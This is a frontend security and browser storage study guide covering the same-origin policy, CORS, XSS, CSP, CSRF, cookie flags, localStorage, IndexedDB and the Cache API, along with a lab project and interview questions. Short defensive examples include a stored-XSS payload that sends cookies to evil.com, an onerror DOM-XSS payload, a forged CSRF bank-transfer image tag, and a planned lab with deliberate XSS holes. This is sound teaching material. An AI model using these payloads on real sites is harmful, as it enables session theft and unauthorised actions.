# Part 7: Security & Storage 🔒

## Week 7 | 10 hours | Protect your users, persist their data

---

## Why This Matters

Security vulnerabilities in frontend code can expose millions of users.
A Staff Engineer must:
- Prevent XSS, CSRF, and other attacks by design
- Understand CORS deeply (every frontend engineer hits CORS errors)
- Choose the right storage mechanism for each use case
- Design authentication flows that are actually secure

**One XSS vulnerability in production = career-defining incident at FAANG.**

---

## 📖 Reading Plan (3 hours)

### Security:
1. **OWASP Top 10 for Web** (skim for frontend-relevant items)
   - https://owasp.org/www-project-top-ten/

2. **MDN: Web Security**
   - https://developer.mozilla.org/en-US/docs/Web/Security
   - Read: Same-origin policy, CORS, CSP

3. **"The Tangled Web"** by Michal Zalewski (reference — skim relevant chapters)
   - Chapter on same-origin policy, XSS, CSRF

4. **web.dev: "Safe and secure"**
   - https://web.dev/explore/secure

### Storage:
5. **MDN: Web Storage API, IndexedDB, Cookies**
   - https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API
   - https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API
   - https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies

---

## 🧠 Deep Dive: Web Security

### Same-Origin Policy (SOP) — The Foundation

```
An ORIGIN is defined by: Protocol + Host + Port

https://app.example.com:443/page
  ↑        ↑              ↑
Protocol   Host          Port

Same origin:
  https://app.example.com/page1
  https://app.example.com/page2    ← Same! (path doesn't matter)

Different origin:
  http://app.example.com           ← Different protocol (http vs https)
  https://api.example.com          ← Different host (subdomain is different!)
  https://app.example.com:8080     ← Different port

THE RULE: Scripts from origin A cannot read responses from origin B
          (unless origin B explicitly allows it via CORS)

What SOP blocks:
  ✗ fetch('https://api.other-site.com/data')  — blocked (different origin)
  ✗ Reading iframe content from different origin
  ✗ Reading cookies from different origin

What SOP allows:
  ✓ Loading images from any origin (<img src="...">)
  ✓ Loading scripts from any origin (<script src="...">)
  ✓ Loading CSS from any origin (<link href="...">)
  ✓ Sending requests (the request IS sent, but response is blocked)
  ✓ Form submissions to any origin
```

---

### CORS — Cross-Origin Resource Sharing

```
CORS is the mechanism that RELAXES the same-origin policy.
It lets servers say: "I allow requests from these origins."

Two types of CORS requests:
1. SIMPLE REQUEST — sent directly
2. PREFLIGHT REQUEST — browser sends OPTIONS first to check permissions
```

**Simple Request (no preflight):**
```
Conditions for simple request:
- Method: GET, HEAD, or POST
- Headers: Only "safe" headers (Accept, Content-Type with limited values, etc.)
- Content-Type: text/plain, multipart/form-data, or application/x-www-form-urlencoded

Browser sends:
  GET /api/data HTTP/1.1
  Host: api.example.com
  Origin: https://app.example.com    ← Browser adds this automatically

Server responds:
  HTTP/1.1 200 OK
  Access-Control-Allow-Origin: https://app.example.com  ← Must match Origin
  (or Access-Control-Allow-Origin: *)

If header is missing or doesn't match → browser BLOCKS the response
(Server still processes the request! CORS is browser-enforced, not server-enforced)
```

**Preflight Request (OPTIONS check):**
```
When does preflight happen?
- Method: PUT, DELETE, PATCH, or any custom method
- Headers: Custom headers (Authorization, X-Custom-Header, etc.)
- Content-Type: application/json (not in the "safe" list!)

Step 1: Browser sends OPTIONS request FIRST
  OPTIONS /api/data HTTP/1.1
  Host: api.example.com
  Origin: https://app.example.com
  Access-Control-Request-Method: POST
  Access-Control-Request-Headers: Content-Type, Authorization

Step 2: Server responds with allowed methods/headers
  HTTP/1.1 204 No Content
  Access-Control-Allow-Origin: https://app.example.com
  Access-Control-Allow-Methods: GET, POST, PUT, DELETE
  Access-Control-Allow-Headers: Content-Type, Authorization
  Access-Control-Max-Age: 86400    ← Cache preflight for 24 hours

Step 3: If allowed, browser sends the ACTUAL request
  POST /api/data HTTP/1.1
  Host: api.example.com
  Origin: https://app.example.com
  Content-Type: application/json
  Authorization: Bearer token123
```

**CORS with Credentials (Cookies):**
```javascript
// By default, cross-origin requests don't include cookies
// To include cookies:

// Frontend:
fetch('https://api.example.com/data', {
  credentials: 'include'  // Send cookies with cross-origin request
});

// Backend must respond with:
// Access-Control-Allow-Origin: https://app.example.com  (NOT * — must be specific!)
// Access-Control-Allow-Credentials: true

// If Access-Control-Allow-Origin is * AND credentials: 'include'
// → Browser REJECTS the response (wildcard not allowed with credentials)
```

**Common CORS Errors and Fixes:**
```
Error: "No 'Access-Control-Allow-Origin' header is present"
Fix: Server must add Access-Control-Allow-Origin header

Error: "The value of 'Access-Control-Allow-Origin' must not be the wildcard"
Fix: When using credentials, specify exact origin (not *)

Error: "Request header field X is not allowed"
Fix: Server must include X in Access-Control-Allow-Headers

Error: "Method PUT is not allowed"
Fix: Server must include PUT in Access-Control-Allow-Methods

IMPORTANT: CORS errors happen in the BROWSER, not the server.
- Server receives and processes the request normally
- Browser blocks YOUR CODE from reading the response
- This is why APIs work in Postman but not in the browser
- CORS is a BROWSER security feature, not a server security feature
```

---

### XSS — Cross-Site Scripting

```
XSS: Attacker injects malicious scripts into your website
that execute in other users' browsers.

Three types:
1. STORED XSS — malicious script saved in database, served to users
2. REFLECTED XSS — malicious script in URL, reflected in response
3. DOM-BASED XSS — malicious script manipulates DOM directly
```

**Stored XSS Example:**
```javascript
// User submits a comment:
// <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

// If your app renders this without sanitization:
commentElement.innerHTML = userComment; // 💀 DANGEROUS!
// The script executes → steals cookies → sends to attacker

// FIXES:
// 1. Use textContent instead of innerHTML
commentElement.textContent = userComment; // Safe! Treats as text, not HTML

// 2. If you MUST render HTML, sanitize it
import DOMPurify from 'dompurify';
commentElement.innerHTML = DOMPurify.sanitize(userComment);

// 3. Frameworks handle this by default:
// Vue: {{ userComment }} → auto-escaped (safe)
//      v-html="userComment" → NOT escaped (dangerous, use carefully!)
// React: {userComment} → auto-escaped (safe)
//        dangerouslySetInnerHTML → NOT escaped (dangerous!)
```

**DOM-Based XSS Example:**
```javascript
// URL: https://app.com/search?q=<img src=x onerror=alert(1)>

// If your code does:
const query = new URLSearchParams(window.location.search).get('q');
document.getElementById('search-results').innerHTML = `Results for: ${query}`;
// 💀 Script executes from URL parameter!

// FIX: Never put user input into innerHTML
document.getElementById('search-results').textContent = `Results for: ${query}`;
```

**XSS Prevention Checklist:**
```
1. ✅ Never use innerHTML with user input (use textContent)
2. ✅ Use framework auto-escaping (Vue {{ }}, React {})
3. ✅ Sanitize HTML if you must render user HTML (DOMPurify)
4. ✅ Set Content Security Policy (CSP) headers
5. ✅ Use HttpOnly cookies (JS can't access them)
6. ✅ Validate and sanitize on the SERVER too (defense in depth)
7. ✅ Avoid eval(), new Function(), setTimeout(string)
8. ✅ Don't put user input in <script> tags, href, onclick, etc.
```

---

### Content Security Policy (CSP)

```
CSP tells the browser WHICH sources are allowed to load resources.
Even if an attacker injects a script, CSP blocks it.

HTTP Header:
Content-Security-Policy:
  default-src 'self';                    ← Only load from same origin
  script-src 'self' https://cdn.example.com;  ← Scripts from self + CDN
  style-src 'self' 'unsafe-inline';      ← Styles from self + inline
  img-src 'self' https: data:;           ← Images from self + any HTTPS + data URIs
  connect-src 'self' https://api.example.com;  ← Fetch/XHR to self + API
  font-src 'self' https://fonts.gstatic.com;   ← Fonts
  frame-src 'none';                      ← No iframes allowed
  object-src 'none';                     ← No plugins (Flash, etc.)
  base-uri 'self';                       ← Restrict <base> tag

Key directives:
  'self'          — same origin only
  'none'          — block everything
  'unsafe-inline' — allow inline scripts/styles (weakens CSP!)
  'unsafe-eval'   — allow eval() (weakens CSP!)
  'nonce-{random}' — allow specific inline scripts with matching nonce
  'strict-dynamic' — trust scripts loaded by already-trusted scripts

Best Practice: Use nonce-based CSP (avoids 'unsafe-inline')

Server generates random nonce per request:
Content-Security-Policy: script-src 'nonce-abc123'

<script nonce="abc123">
  // This script runs — nonce matches
</script>
<script>
  // This script is BLOCKED — no nonce
  // Even if attacker injects it via XSS!
</script>
```

---

### CSRF — Cross-Site Request Forgery

```
CSRF: Attacker tricks user's browser into making authenticated requests
to a site where the user is logged in.

How it works:
1. User is logged into bank.com (has session cookie)
2. User visits evil.com
3. evil.com has: <img src="https://bank.com/transfer?to=attacker&amount=10000">
4. Browser sends request WITH bank.com cookies (automatic!)
5. Bank processes the transfer — user didn't consent!

Prevention:
1. CSRF Tokens (traditional)
   - Server generates random token, embeds in form
   - Server validates token on submission
   - Attacker can't guess the token

2. SameSite Cookies (modern — best approach)
   Set-Cookie: session=abc123; SameSite=Strict

   SameSite=Strict:  Cookie NEVER sent on cross-site requests
   SameSite=Lax:     Cookie sent on top-level GET navigations only
                     (clicking a link to bank.com from google.com → sent)
                     (img/iframe/fetch from evil.com → NOT sent)
   SameSite=None:    Cookie always sent (must also have Secure flag)

   Default is Lax in modern browsers.

3. Check Origin/Referer header (additional defense)
   Server checks that request came from expected origin.

For SPAs with JWT:
- Store token in memory (not localStorage!)
- Send in Authorization header (not cookies)
- CSRF not possible because attacker can't access the token
```

---

### Cookie Security

```
Set-Cookie: session=abc123;
  Secure;         ← Only sent over HTTPS
  HttpOnly;       ← JavaScript can't read it (prevents XSS cookie theft)
  SameSite=Lax;   ← Prevents CSRF
  Path=/;          ← Cookie sent for all paths
  Domain=.example.com;  ← Cookie sent to all subdomains
  Max-Age=86400;   ← Expires in 24 hours (0 = delete immediately)

ALWAYS use: Secure + HttpOnly + SameSite for session cookies
```

---

### Other Security Topics

```
1. CLICKJACKING
   Attack: Embed your site in an invisible iframe on evil.com
   User thinks they're clicking evil.com but actually clicking your site

   Prevention:
   X-Frame-Options: DENY (or SAMEORIGIN)
   Content-Security-Policy: frame-ancestors 'none'

2. OPEN REDIRECT
   Attack: https://app.com/redirect?url=https://evil.com
   User trusts app.com link but gets redirected to evil.com

   Prevention: Validate redirect URLs against allowlist

3. SUBRESOURCE INTEGRITY (SRI)
   Ensure CDN-hosted scripts haven't been tampered with:
   <script src="https://cdn.example.com/lib.js"
           integrity="sha384-abc123..."
           crossorigin="anonymous"></script>
   Browser computes hash of downloaded file, compares with integrity attribute
   If different → script is BLOCKED

4. HTTPS EVERYWHERE
   - Mixed content: HTTP resource on HTTPS page → browser may block
   - HSTS header: Strict-Transport-Security: max-age=31536000; includeSubDomains
   - Forces HTTPS for your domain, prevents downgrade attacks

5. INPUT VALIDATION
   Never trust client-side validation alone.
   Always validate on server too.
   Client validation = UX improvement
   Server validation = actual security
```

---

## 🧠 Deep Dive: Web Storage

### Storage Comparison

```
┌──────────────────────────────────────────────────────────────────────┐
│                        STORAGE OPTIONS                               │
├──────────────┬──────────┬───────────┬────────────┬──────────────────┤
│              │ Cookies  │ localStorage │ sessionStorage │ IndexedDB  │
├──────────────┼──────────┼───────────┼────────────┼──────────────────┤
│ Size limit   │ ~4KB     │ ~5-10MB   │ ~5-10MB    │ Hundreds of MB  │
│ Persistence  │ Expires  │ Forever   │ Tab close  │ Forever         │
│ Sent to      │ Yes!     │ No        │ No         │ No              │
│  server?     │(every req)│           │            │                 │
│ API          │ String   │ Sync      │ Sync       │ Async           │
│ Scope        │ Domain+  │ Origin    │ Origin+Tab │ Origin          │
│              │ path     │           │            │                 │
│ Access from  │ Server+  │ Client    │ Client     │ Client+Worker   │
│              │ Client   │ only      │ only       │                 │
│ Thread safe  │ N/A      │ No        │ No         │ Yes (ACID)      │
│ Structured   │ No       │ No        │ No         │ Yes (objects,   │
│  data?       │ (string) │ (string)  │ (string)   │  indexes)       │
└──────────────┴──────────┴───────────┴────────────┴──────────────────┘
```

### localStorage / sessionStorage

```javascript
// Simple key-value storage (strings only!)

// SET
localStorage.setItem('theme', 'dark');
localStorage.setItem('user', JSON.stringify({ name: 'Ganesh', role: 'engineer' }));

// GET
const theme = localStorage.getItem('theme'); // 'dark'
const user = JSON.parse(localStorage.getItem('user')); // { name: 'Ganesh', ... }

// REMOVE
localStorage.removeItem('theme');

// CLEAR ALL
localStorage.clear();

// LISTEN for changes (cross-tab!)
window.addEventListener('storage', (event) => {
  // Only fires in OTHER tabs (not the one that made the change)
  console.log(`Key: ${event.key}, Old: ${event.oldValue}, New: ${event.newValue}`);
  // Use case: Sync theme, auth state across tabs
});

// IMPORTANT LIMITATIONS:
// 1. Synchronous — blocks main thread during read/write
// 2. String only — must JSON.stringify/parse objects
// 3. No indexing — can't query by value
// 4. No transactions — race conditions possible
// 5. ~5MB limit — throws QuotaExceededError when full
// 6. Available in main thread only (NOT in Web Workers)

// SECURITY WARNING:
// ❌ NEVER store sensitive data in localStorage
// ❌ NEVER store auth tokens in localStorage (XSS can read them!)
// ✅ Use HttpOnly cookies for session tokens
// ✅ Use memory (JavaScript variable) for access tokens in SPAs
```

### IndexedDB (for serious storage)

```javascript
// IndexedDB: Full database in the browser
// Async, transactional, supports indexes, stores structured data

// Open database
const request = indexedDB.open('myDatabase', 1);

request.onupgradeneeded = (event) => {
  const db = event.target.result;

  // Create object store (like a table)
  const store = db.createObjectStore('notes', { keyPath: 'id', autoIncrement: true });

  // Create indexes (for querying)
  store.createIndex('title', 'title', { unique: false });
  store.createIndex('createdAt', 'createdAt', { unique: false });
  store.createIndex('tags', 'tags', { multiEntry: true }); // array index
};

request.onsuccess = (event) => {
  const db = event.target.result;

  // WRITE: Add a note
  const tx = db.transaction('notes', 'readwrite');
  const store = tx.objectStore('notes');
  store.add({
    title: 'Meeting Notes',
    content: 'Discussed architecture...',
    tags: ['work', 'architecture'],
    createdAt: new Date()
  });

  // READ: Get by key
  const getRequest = store.get(1);
  getRequest.onsuccess = () => console.log(getRequest.result);

  // READ: Get by index
  const index = store.index('title');
  const indexRequest = index.get('Meeting Notes');

  // READ: Get all with cursor
  const cursorRequest = store.openCursor();
  cursorRequest.onsuccess = (event) => {
    const cursor = event.target.result;
    if (cursor) {
      console.log(cursor.value);
      cursor.continue(); // move to next
    }
  };

  // DELETE
  store.delete(1);
};

// IndexedDB wrapper (Dexie.js — makes IndexedDB usable)
// import Dexie from 'dexie';
//
// const db = new Dexie('myDatabase');
// db.version(1).stores({
//   notes: '++id, title, *tags, createdAt'
// });
//
// await db.notes.add({ title: 'Hello', content: '...', tags: ['test'] });
// const note = await db.notes.get(1);
// const results = await db.notes.where('tags').equals('work').toArray();
```

### Cache API (for network responses)

```javascript
// Cache API: Store request/response pairs
// Used primarily by Service Workers, but available in main thread too

// Open a cache
const cache = await caches.open('my-cache-v1');

// Store a response
await cache.put('/api/data', new Response(JSON.stringify({ key: 'value' })));

// Store from network
await cache.add('/api/users'); // fetches and caches
await cache.addAll(['/app.js', '/style.css', '/index.html']); // batch

// Retrieve
const response = await cache.match('/api/data');
if (response) {
  const data = await response.json();
}

// Delete
await cache.delete('/api/data');

// Delete entire cache
await caches.delete('my-cache-v1');
```

### When to Use What

```
USE CASE                          → STORAGE
──────────────────────────────────────────────────────
Session authentication            → HttpOnly Secure Cookie
Theme preference                  → localStorage
Form draft (temporary)            → sessionStorage
Offline data (notes, messages)    → IndexedDB
Cached API responses              → Cache API (via Service Worker)
Large files (images, videos)      → IndexedDB or Cache API
User preferences (complex)        → IndexedDB
Search history                    → localStorage (simple) or IndexedDB (complex)
Shopping cart (persist)            → localStorage (small) or IndexedDB (large)
Access token (SPA)                → Memory (JS variable) — NEVER localStorage
Refresh token                     → HttpOnly Secure Cookie
```

---

## 🔨 Build Project (4 hours)

### Project: Secure Storage Manager + Auth Flow Demo

```
security-storage-project/
├── xss-demo/
│   ├── index.html
│   └── script.js       (demonstrate XSS attacks + prevention)
├── cors-demo/
│   ├── server.js        (Node.js with different CORS configs)
│   └── client.html      (make requests, see CORS errors/success)
├── storage-manager/
│   ├── index.html
│   └── storage.js       (unified API for all storage types)
└── auth-demo/
    ├── server.js
    └── index.html       (secure auth flow implementation)
```

#### Part A: XSS Attack & Defense Lab
```javascript
// Build a page with intentional XSS vulnerabilities:
// 1. Stored XSS: Comment form → renders without sanitization
// 2. DOM XSS: URL parameter injected into DOM
// 3. Show the attack working
// 4. Then show the FIX for each:
//    - textContent instead of innerHTML
//    - DOMPurify sanitization
//    - CSP header blocking inline scripts
```

#### Part B: CORS Playground
```javascript
// Node.js server with multiple CORS configurations:
// Route 1: No CORS headers (request blocked)
// Route 2: Access-Control-Allow-Origin: * (works for simple requests)
// Route 3: Specific origin + credentials (works with cookies)
// Route 4: Missing headers for preflight (preflight fails)
// Route 5: Correct preflight response (works)
//
// Client page makes requests to each route
// Display: Request/response headers, success/failure, preflight details
```

#### Part C: Unified Storage API
```javascript
// Build a storage abstraction that picks the right storage:
class StorageManager {
  // Small, simple data → localStorage
  async setPreference(key, value) { }
  async getPreference(key) { }

  // Large, structured data → IndexedDB
  async saveDocument(doc) { }
  async getDocument(id) { }
  async queryDocuments(filter) { }

  // Network responses → Cache API
  async cacheResponse(url, response) { }
  async getCachedResponse(url) { }

  // Storage quota management
  async getStorageEstimate() {
    const estimate = await navigator.storage.estimate();
    return {
      used: estimate.usage,        // bytes used
      available: estimate.quota,   // bytes available
      percentage: (estimate.usage / estimate.quota * 100).toFixed(2)
    };
  }
}
```

#### Part D: Secure Authentication Flow
```javascript
// Implement the recommended SPA auth flow:
// 1. Login: POST /auth/login → receive access token + refresh token
//    - Access token: Store in memory (JS variable)
//    - Refresh token: HttpOnly Secure SameSite=Strict cookie (server sets it)
// 2. API calls: Send access token in Authorization header
// 3. Token refresh: When access token expires (401), call /auth/refresh
//    - Refresh token sent automatically as cookie
//    - Receive new access token
// 4. Logout: Clear memory + call /auth/logout (server clears cookie)
// 5. Tab sync: Use BroadcastChannel to sync auth state across tabs
```

---

## ❓ Interview Questions You Must Answer (2 hours)

### Basic:
1. **What is the Same-Origin Policy?**
2. **What is CORS? Why does it exist? How does it work?**
3. **What is XSS? What are the three types? How do you prevent it?**
4. **What is the difference between localStorage, sessionStorage, and cookies?**
5. **Why should you never store auth tokens in localStorage?**

### Intermediate:
6. **Explain CORS preflight requests. When do they happen?**
7. **What is CSP (Content Security Policy)? How does it prevent XSS?**
8. **What is CSRF? How do SameSite cookies prevent it?**
9. **When would you use IndexedDB vs localStorage?**
10. **How would you implement secure authentication in a SPA?**
    - Access token in memory, refresh token in HttpOnly cookie
    - Token refresh flow, logout flow

### Advanced:
11. **Design a complete frontend security strategy for a banking application.**
    - CSP headers, CORS config, SameSite cookies, HttpOnly, Secure
    - Input sanitization, output encoding
    - Subresource integrity for CDN scripts
    - X-Frame-Options to prevent clickjacking
    - HSTS for HTTPS enforcement

12. **What is the difference between `Access-Control-Allow-Origin: *` and a specific origin?**
    - `*` doesn't work with `credentials: 'include'`
    - Specific origin allows credentials
    - Some servers dynamically set it based on Origin header (risky if not validated)

13. **How does Subresource Integrity (SRI) work?**
14. **Explain the Cookie attributes: Secure, HttpOnly, SameSite, Domain, Path, Max-Age.**
15. **How would you handle storage quota limits gracefully in a web app?**
    - navigator.storage.estimate()
    - Implement LRU eviction for cached data
    - Compress data before storing
    - Prompt user when quota is low

---

## ✅ Week 7 Completion Checklist

- [ ] Understand Same-Origin Policy deeply
- [ ] Can explain CORS: simple requests, preflight, credentials
- [ ] Can identify and prevent XSS (stored, reflected, DOM-based)
- [ ] Understand CSP headers and how to configure them
- [ ] Understand CSRF and SameSite cookie prevention
- [ ] Know all storage options and when to use each
- [ ] Can use IndexedDB for structured data storage
- [ ] Implemented secure auth flow (access token in memory + refresh in cookie)
- [ ] Built XSS attack/defense lab
- [ ] Built CORS playground
- [ ] Can answer all 15 interview questions out loud

---

Next → `08-performance.md`
